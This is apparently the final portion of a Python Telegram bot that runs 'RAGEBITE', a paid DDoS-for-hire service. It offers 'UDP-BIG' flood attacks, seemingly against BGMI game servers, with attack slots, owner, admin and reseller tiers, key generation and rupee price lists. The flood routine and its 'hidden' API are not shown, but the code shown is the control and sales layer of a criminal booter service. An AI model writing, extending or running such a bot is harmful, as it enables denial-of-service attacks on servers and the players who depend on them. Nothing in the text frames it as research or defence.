📅 Server Time: {datetime.datetime.now().strftime('%H:%M:%S')}
🔑 API: Protected (Hidden)
⚡ Method: UDP-BIG
📊 Total Slots: {TOTAL_SLOTS}
📊 Active Attacks: {len([a for a in state["user_attacks"].values() if a["expires"] > now()])}

📊 All systems operational!
💪 Ultimate power ready!'''
    elif is_admin(user_id):
        response = f'''⚡ RAGEBITE STATUS - ADMIN VIEW:

🌐 Service Status: Online ✅
📅 Server Time: {datetime.datetime.now().strftime('%H:%M:%S')}

📊 All systems operational!
💪 Ultimate power ready!

👑 Admin Commands:
• /addadmin - Add admin
• /removeadmin - Remove admin
• /activeattacks - See active attacks
📌 Admin = 1 attack at a time (same as users)
📌 Owner cannot be removed'''
    else:
        response = '''⚡ YOUR STATUS:

🎯 No active attack currently.
💪 Ready to launch!

Use /bgmi to start.
📌 1 attack at a time per user.

🔥 Ragebite - Always Ready!'''
    
    bot.reply_to(message, response)

# ==================== STATS COMMANDS ====================

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.chat.id)
    
    total_users = len(allowed_user_ids)
    active_users = len([a for a in state["user_attacks"].values() if a["expires"] > now()])
    history_count = len(state.get("attack_history", []))
    
    if is_owner(user_id):
        response = f'''📊 RAGEBITE STATISTICS - OWNER VIEW:

👥 Total Users: {total_users}
🔥 Active Users: {active_users}
👑 Admins: {len(state.get('admins', []))}
📜 Total Attacks: {history_count}
📊 Total Slots: {TOTAL_SLOTS}

📌 System Rules:
• Users: 1 Attack at a time
• Admin: 1 Attack at a time (same as users)
• Owner: Unlimited attacks
• Admin can add/remove admins
• Owner cannot be removed
• Method: UDP-BIG (Fixed)
• API: Protected (Hidden)'''
    
    elif is_admin(user_id):
        response = f'''📊 RAGEBITE STATISTICS - ADMIN VIEW:

👥 Total Users: {total_users}
🔥 Active Users: {active_users}
👑 Admins: {len(state.get('admins', []))}
📜 Total Attacks: {history_count}
📊 Total Slots: {TOTAL_SLOTS}

📌 System Rules:
• Users: 1 Attack at a time
• Admin: 1 Attack at a time (same as users)
• Owner: Unlimited attacks
• Admin can add/remove admins
• Owner cannot be removed'''
    
    else:
        response = f'''📊 RAGEBITE STATISTICS:

👥 Total Users: {total_users}
🔥 Active Users: {active_users}
📜 Total Attacks: {history_count}

📌 System Rules:
• Users: 1 Attack at a time
• Different users can attack simultaneously
• Max 300 seconds per attack

🔑 Status: Active ✅'''
    
    bot.reply_to(message, response)

# ==================== MAIN ====================
def main():
    load_state()
    global allowed_user_ids
    allowed_user_ids = read_users()
    
    threading.Thread(target=start_health_server, daemon=True).start()
    
    print("="*50)
    print("🌟 RAGEBITE ATTACK BOT STARTED!")
    print("="*50)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"👥 Admins: {state.get('admins', [])}")
    print(f"👥 Users: {len(allowed_user_ids)}")
    print(f"🔑 API: Protected (Hidden from all users)")
    print(f"📊 Total Slots: {TOTAL_SLOTS}")
    print("="*50)
    print("📌 USER PRICES (Rs):")
    print("  • 12 Hours: 100 Rs")
    print("  • 1 Day: 150 Rs")
    print("  • 1 Week: 600 Rs")
    print("  • 15 Days: 750 Rs")
    print("  • 1 Month: 1400 Rs")
    print("="*50)
    print("📌 RESELLER PRICES (Coins - 10/day):")
    print("  • 12 Hours: 5 coins")
    print("  • 1 Day: 10 coins")
    print("  • 1 Week: 70 coins")
    print("  • 15 Days: 150 coins")
    print("  • 1 Month: 300 coins")
    print("="*50)
    print("📌 RULES:")
    print("  • 4 Slots available")
    print("  • 1 User = 1 Attack at a time")
    print("  • Admin = 1 Attack at a time (same as users)")
    print("  • Owner = Unlimited attacks")
    print("  • Admin can add/remove admins")
    print("  • Owner cannot be removed")
    print("  • Method: UDP-BIG (Fixed)")
    print("="*50)
    print("👑 OWNER COMMANDS:")
    print("  • /ownerpanel - Full control")
    print("  • /addadmin - Add admin")
    print("  • /removeadmin - Remove admin")
    print("="*50)
    print("👑 ADMIN COMMANDS:")
    print("  • /generate - Generate keys")
    print("  • /deletekey - Delete keys")
    print("  • /add - Add users")
    print("  • /remove - Remove users")
    print("  • /activeattacks - See active attacks")
    print("  • /addadmin - Add admin")
    print("  • /removeadmin - Remove admin")
    print("="*50)
    print("✅ Bot is running...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=60)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()